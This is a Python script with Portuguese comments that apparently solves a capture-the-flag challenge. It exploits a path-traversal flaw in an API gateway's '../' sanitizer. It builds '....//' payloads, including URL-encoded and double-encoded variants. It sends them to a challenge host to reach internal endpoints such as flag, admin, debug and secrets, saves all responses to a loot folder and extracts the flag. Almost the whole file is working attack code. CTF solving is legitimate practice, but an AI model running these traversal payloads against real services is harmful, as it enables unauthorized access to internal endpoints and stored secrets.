#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
script1.py

Enumeração inicial do desafio Read Between the Lines.

Objetivo:
- Confirmar endpoints públicos do gateway.
- Testar a falha de sanitização em /api/profile/<username>.
- Usar payloads do tipo ....//, que viram ../ depois do replace("../", "").
- Procurar endpoints internos prováveis no backend, como /flag, /admin, /debug etc.

A vulnerabilidade vem do gateway.py:

    safe_username = sanitize_path(username)
    internal_url = f"{BACKEND_URL}/users/{safe_username}"

Se username = ....//flag
safe_username pode virar ../flag
e o backend pode interpretar /users/../flag como /flag.
"""

import os
import re
import sys
import requests
from urllib.parse import quote


requests.packages.urllib3.disable_warnings()


def request(base_url, path):
    """
    Faz uma requisição GET preservando o path informado.
    O requests normalmente não mexe em sequências como ....// no path externo.
    """
    url = base_url.rstrip("/") + path

    try:
        response = requests.get(
            url,
            timeout=10,
            verify=False,
            allow_redirects=False,
        )

        return response.status_code, response.text, dict(response.headers)

    except requests.RequestException as error:
        return None, str(error), {}


def print_result(label, path, status, body):
    """
    Imprime resultado resumido e destaca possíveis flags.
    """
    print()
    print("=" * 90)
    print(f"[TESTE] {label}")
    print(f"[PATH ] {path}")
    print(f"[HTTP ] {status}")
    print("-" * 90)

    shown = body
    if len(shown) > 1200:
        shown = shown[:1200] + "\n...[TRUNCADO]..."

    print(shown)

    match = re.search(r"flag\{[^}\r\n]+\}", body, re.IGNORECASE)
    if match:
        flag = match.group(0)
        print()
        print("=" * 90)
        print("[+] FLAG ENCONTRADA")
        print("=" * 90)
        print(flag)

        with open("flag.txt", "w", encoding="utf-8") as flag_file:
            flag_file.write(flag + "\n")

        print("[+] Flag salva em flag.txt")
        sys.exit(0)


def main():
    target = os.environ.get("TARGET", "77f39209681106af.chal.ctf.ae").strip()

    # Testamos HTTP e HTTPS porque em alguns desafios o painel mostra HTTP,
    # mas o domínio também aceita HTTPS.
    bases = [
        f"http://{target}",
        f"https://{target}",
    ]

    # Endpoints públicos documentados pelo gateway.
    public_paths = [
        "/",
        "/health",
        "/api/users",
        "/api/profile/admin",
        "/api/profile/guerreiro",
        "/api/profile/alice",
        "/api/profile/bob",
    ]

    # Candidatos comuns de endpoints internos em CTFs de API.
    internal_candidates = [
        "flag",
        "admin",
        "admin/flag",
        "internal",
        "internal/flag",
        "debug",
        "debug/config",
        "config",
        "secret",
        "secrets",
        "backup",
        "backups",
        "health",
        "users",
        "users/admin",
        "profiles",
        "profile/admin",
        "api",
        "api/users",
        "api/flag",
        "api/admin",
    ]

    # Payload principal:
    # /api/profile/....//flag
    #
    # No gateway:
    # username      = ....//flag
    # safe_username = ../flag
    # internal_url  = http://backend/users/../flag
    traversal_paths = []

    for candidate in internal_candidates:
        traversal_paths.append(f"/api/profile/....//{candidate}")

    # Também testamos variações com URL encoding.
    # Algumas camadas decodificam antes de passar ao Flask.
    for candidate in internal_candidates:
        traversal_paths.append(f"/api/profile/....%2f%2f{quote(candidate)}")
        traversal_paths.append(f"/api/profile/....%252f%252f{quote(candidate)}")

    os.makedirs("loot", exist_ok=True)

    for base_url in bases:
        print()
        print("#" * 90)
        print(f"[*] Testando base URL: {base_url}")
        print("#" * 90)

        all_paths = public_paths + traversal_paths

        for path in all_paths:
            status, body, headers = request(base_url, path)

            label = "public" if path in public_paths else "traversal"
            print_result(label, path, status, body)

            safe_name = (
                base_url.replace("://", "_")
                .replace("/", "_")
                .replace(":", "_")
                + path.replace("/", "_").replace("%", "_")
            )

            with open(f"loot/resp_{safe_name}.txt", "w", encoding="utf-8") as output:
                output.write(f"URL: {base_url.rstrip('/') + path}\n")
                output.write(f"STATUS: {status}\n")
                output.write("\n")
                output.write(body)


if __name__ == "__main__":
    main()
